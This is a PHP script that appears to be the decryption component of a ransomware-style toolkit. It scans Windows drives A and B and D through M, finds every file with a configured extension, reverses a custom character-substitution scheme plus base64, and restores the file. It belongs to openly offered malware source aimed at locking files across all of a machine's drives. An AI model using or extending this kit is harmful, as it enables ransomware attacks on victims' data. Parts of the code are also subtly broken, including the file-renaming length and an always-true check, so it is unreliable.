<?php 
	
    /*
        Author Jieyab89 
        Compile : using php exe output or other php executable
    */
        
	ini_set('output_buffering', 'off');
	ini_set('zlib.output_compression', false);
	error_reporting(0);
    
    /* get file config.json */
    $file  = file_get_contents("config-windows-encrypt.json");
    $files = json_decode($file);

    $root = $files->root;
    $ext  = $files->ext;
    $extLength = -(strlen($ext) + 1);

	/* DISK */
    $disk = ["A", "B", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M"];
    $diskArr = [];
	$diskAll = '';
	
	function checkDisk($disk){
        $diskDectec = disk_free_space("$disk:");
        
        if($diskDectec){
            return true;
        }else{
            return false;
        }
	}
	
	/* check disk and output */
    foreach ($disk as $key) {
        
        if(checkDisk($key)){

            $diskArr[] = $key;
            $diskAll .= $key."|";
		}
    }

	function decryptFile($value, $dir){
		
		global $extLength;

		$decArr = ["~" => "a","@" => "b","Y" => "c","O" => "d","]" => "e","V" => "f","uP" => "g","#" => "h","4a" => "i","m+" => "j","z" => "k","b;" => "l","7" => "m","3" => "n","z*" => "o","m" => "p","4" => "q","%" => "r","Yp" => "s","W" => "t","U" => "u","N" => "v","a" => "w","(" => "x","|o" => "y","/" => "z","G" => "A","M" => "B","mM" => "C","B" => "D","1<" => "E","*" => "F","a#" => "G","S" => "H","&" => "I","0v" => "J","H" => "K","1+" => "L","G/" => "M","x?" => "N","h1" => "O","Ux" => "P","L4" => "Q","v" => "R","u" => "S","aW" => "T","4L" => "U","L" => "V","J" => "W","8" => "X","n" => "Y","" => "Z","x" => "1","b" => "2","+7" => "3","X" => "4","s" => "5",")" => "6","$" => "7","o" => "8","+" => "9","A" => "0","w" => "=","[4" => "+","1" => "/"];

		$file = '';
		$ex = explode(".", $value);
		foreach ($ex as $key) {
			if ($key !== '' || $key !== ' ') {
				
				$file .= $decArr[$key];	
				// echo $decArr[$key]."\n";
			}
		}
		
		$fileAsli = base64_decode($file);

		$o = fopen($dir, 'w');
		fwrite($o, $fileAsli);
		fclose($o);

		rename($dir, substr($dir, 0, $extLength));
		// echo "[+] Decrypt File => $dir \n";
	}

	function getFile($dir){

		global $ext;

		$fileList = glob($dir."/*");
		foreach ($fileList as $filename) {
			
			if(is_file($filename)){

				$info = pathinfo($filename);
				if ($info['extension'] === $ext) {

					$base = file_get_contents($filename);
					decryptFile($base, $filename);	
					echo $info['extension']. "\n";
				}
				// echo $ext."\n";
		    }else{
				if ($filename !== $dir.'/$RECYCLE.BIN') {
                    
                    getFile($filename);
                }
		    }   
		}
	}
	echo "\n[+] ".count($diskArr)." Disk Detected";

    foreach ($diskArr as $key) {

        $root = $key.":\\";
        $ext  = $files->ext;
        $extLength = strlen($ext) + 1;

        getFile($root);
	}
	// print_r($diskArr);
	
	echo "\n\n[+] Decrypt File Successfuly :)\n";
?>